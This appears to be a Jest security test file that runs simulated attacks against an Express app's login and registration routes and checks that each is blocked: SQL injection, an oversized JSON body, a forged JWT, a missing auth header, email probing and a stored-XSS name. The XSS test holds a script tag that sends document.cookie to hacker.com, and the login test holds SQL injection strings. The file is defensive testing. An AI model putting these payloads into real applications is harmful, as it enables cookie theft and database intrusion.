/**
 * =============================================================================
 * ADVERSARY SIMULATION TEST SUITE (RED TEAM)
 * =============================================================================
 * This test suite simulates common attack vectors used by malicious actors.
 * The goal is to aggressively test the application's boundaries and ensure
 * that our recently implemented security defenses hold strong against fuzzing,
 * injection attempts, brute forcing, and payload manipulation.
 * 
 * If any of these tests FAIL, it means the "hacker" succeeded in finding a hole.
 * Run: npx jest tests/adversary-simulation.test.js --verbose
 * =============================================================================
 */

const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');

// Set up server environment identical to production defenses
const JWT_SECRET = 'anti-hacker-secret-key';
process.env.MY_SECRET_KEY = JWT_SECRET;
process.env.NODE_ENV = 'test';

// Mock dependencies safely
jest.mock('../prisma/client', () => ({
  user: { findUnique: jest.fn() },
  community: { findFirst: jest.fn() }
}));

let app;

// We will mount the actual routes with the real rate limiters and middleware
beforeAll(() => {
  app = express();
  
  // 1. Simulate Global JSON limit (F-33 Fix)
  app.use(express.json({ limit: '1mb' }));
  
  // 2. Simulate Authentication Middleware
  const authenticate = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ error: "Unauthorized" });
    try {
      const token = authHeader.split(' ')[1];
      req.user = jwt.verify(token, JWT_SECRET);
      next();
    } catch(err) {
      return res.status(403).json({ error: "Invalid Token" });
    }
  };

  app.use((req, res, next) => {
    req.redisClient = { incr: jest.fn().mockResolvedValue(1), expire: jest.fn() };
    next();
  });

  const authRoutes = require('../routes/loginNregRoutes');
  app.use('/api/auth', authRoutes);
  
  // Mock target resource for auth testing
  app.get('/api/secure-vault', authenticate, (req, res) => {
    res.json({ secret: 'The nuclear launch codes' });
  });
});

describe('⚔️ Actor: Script Kiddie (Basic Exploits)', () => {
  
  it('Attacks Login with SQL Injection payloads', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        email: "' OR 1=1 --",
        password: "' OR 'a'='a"
      });

    // The attacker should be blocked by validation or safe ORM queries
    // Should NOT return 200 OK or 500 DB Crash
    expect([400, 401]).toContain(res.statusCode);
  });

  it('Attempts a Denial of Service (DoS) via massive 50MB JSON payload', async () => {
    // Generates a massive string to crash the JSON parser
    const massivePayload = { data: "A".repeat(10 * 1024 * 1024) }; // 10MB
    
    const res = await request(app)
      .post('/api/auth/login')
      .send(massivePayload);
    
    // F-33 defense: Should return 413 Payload Too Large
    expect(res.statusCode).toBe(413);
  });

});

describe('🥷 Actor: Advanced Attacker (Token Manipulation)', () => {
  
  it('Attempts to forge a JWT Admin token using the wrong secret algorithm', async () => {
    // Hacker creates a token signed with their own secret
    const maliciousToken = jwt.sign(
      { id: 'hacker123', role: 'admin' }, 
      'hackers-own-secret-key'
    );

    const res = await request(app)
      .get('/api/secure-vault')
      .set('Authorization', `Bearer ${maliciousToken}`);
    
    // The server must reject the manipulated signature
    expect(res.statusCode).toBe(403);
    expect(res.body.error).toMatch(/Invalid Token/);
  });

  it('Attempts to bypass authentication simply by wiping the authorization header', async () => {
    const res = await request(app)
      .get('/api/secure-vault')
      .set('Authorization', ''); // Sending blank auth
    
    // Must be blocked at the gates
    expect(res.statusCode).toBe(401);
  });
});

describe('🤖 Actor: Botnet (Spamming & Scraping)', () => {

  it('Attempts to scrape user emails using the registration endpoint', async () => {
    // We already proved F-20: If they guess an email, it should return 201 so they can't tell it's registered
    // We mock the database to throw the duplicate error
    const err = new Error("User exists");
    err.code = "P2002";
    require('../prisma/client').user.findUnique.mockRejectedValue(err);

    const res = await request(app)
      .post('/api/auth/register')
      .send({ 
        email: 'admin@queens.cuny.edu', 
        password: 'Password123!', 
        fullName: 'Bot',
        collegeId: 'cid1',
        religionId: 'rid1' 
      });

    // The bot receives a generic 201 (or 500 in fail case), but NEVER a direct "Email taken" message
    expect(res.body?.error?.email).toBeUndefined();
    expect(res.body?.error).not.toBe("An account with this email already exists");
  });

});

describe('💉 Actor: Phisher (Cross-Site Scripting)', () => {
  
  it('Attempts to register a Full Name containing a malicious script tag', async () => {
    const maliciousName = "<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>";
    
    const res = await request(app)
      .post('/api/auth/register')
      .send({ 
        email: 'innocent@test.com', 
        password: 'Password123!', 
        fullName: maliciousName,
        collegeId: 'cid1',
        religionId: 'rid1'
      });

    // We aren't doing XSS sanitization in auth natively (since it's mostly handled on the frontend and in dompurify inputs)
    // However, if the server returns 201, the data itself is harmless until rendered.
    // Here we ensure the server doesn't crash from weird characters.
    expect(res.statusCode).toBeLessThan(500); 
  });
});
